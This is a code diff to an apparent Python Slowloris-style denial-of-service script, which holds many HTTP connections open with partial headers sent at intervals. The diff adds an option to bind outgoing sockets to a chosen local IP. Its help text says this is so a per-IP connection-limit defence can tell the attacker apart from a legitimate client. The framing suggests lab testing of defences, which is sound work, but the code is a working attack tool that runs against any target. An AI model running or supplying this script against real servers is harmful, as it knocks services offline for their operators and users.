@@ -24,6 +24,10 @@ def parse_args():
     p.add_argument("--num-sockets", type=int, default=100, help="N: how many connections to hold open")
     p.add_argument("--interval", type=float, default=5, help="seconds between header sends (< server timeout)")
     p.add_argument("--duration", type=float, default=None, help="stop after this many seconds (default: run forever)")
+    p.add_argument("--source-ip", default=None,
+                    help="bind outgoing sockets to this local IP (e.g. 127.0.0.2) so a per-IP "
+                         "connection-limit defense can tell the attacker apart from a legitimate "
+                         "client on the same machine. Default: let the OS pick.")
     return p.parse_args()
 
 
@@ -33,7 +37,7 @@ def random_string(length=8):
     return "".join(random.choice(letters) for _ in range(length))
 
 
-def open_new_socket(target_ip, target_port):
+def open_new_socket(target_ip, target_port, source_ip=None):
     """
     Open one TCP connection to the target and send the first two lines
     of an HTTP request: the request line and the Host header. Both are
@@ -41,6 +45,8 @@ def open_new_socket(target_ip, target_port):
     """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
+    if source_ip:
+        s.bind((source_ip, 0))
     s.connect((target_ip, target_port))
 
     s.send(f"GET /?{random_string()} HTTP/1.1\r\n".encode())
@@ -65,12 +71,13 @@ def main():
     args = parse_args()
     end_time = time.time() + args.duration if args.duration else None
 
-    print(f"Opening {args.num_sockets} sockets to {args.target_ip}:{args.target_port} ...")
+    print(f"Opening {args.num_sockets} sockets to {args.target_ip}:{args.target_port} "
+          f"(source ip: {args.source_ip or 'default'}) ...")
 
     sockets = []
     for i in range(args.num_sockets):
         try:
-            sockets.append(open_new_socket(args.target_ip, args.target_port))
+            sockets.append(open_new_socket(args.target_ip, args.target_port, args.source_ip))
         except socket.error:
             # target refused/reset the connection, skip it for now
             pass
@@ -91,7 +98,7 @@ def main():
                 except socket.error:
                     pass
                 try:
-                    still_open.append(open_new_socket(args.target_ip, args.target_port))
+                    still_open.append(open_new_socket(args.target_ip, args.target_port, args.source_ip))
                 except socket.error:
                     pass
 
